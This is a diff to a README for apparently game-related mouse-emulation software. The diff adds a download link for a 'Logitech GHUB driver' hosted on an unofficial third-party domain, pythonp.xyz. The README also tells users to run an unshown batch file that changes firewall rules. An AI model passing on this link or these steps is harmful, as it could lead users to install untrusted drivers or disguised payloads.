@@ -16,7 +16,7 @@
 This software includes mouse emulation features requiring a specific version of the Logitech GHUB driver. Follow these steps for proper setup:
 
 1. **Download GHUB Driver:**
-   - Download the required Logitech GHUB driver version [from this link](#).
+   - Download the required Logitech GHUB driver version [from this link](https://www.pythonp.xyz/ghub).
    
 2. **Disable Auto-Update:**
    - To prevent automatic updates, use the provided batch file. Place "disable_internet.bat" in the GHUB installation directory and run it to add a firewall rule, disabling internet access for all executables in that directory.
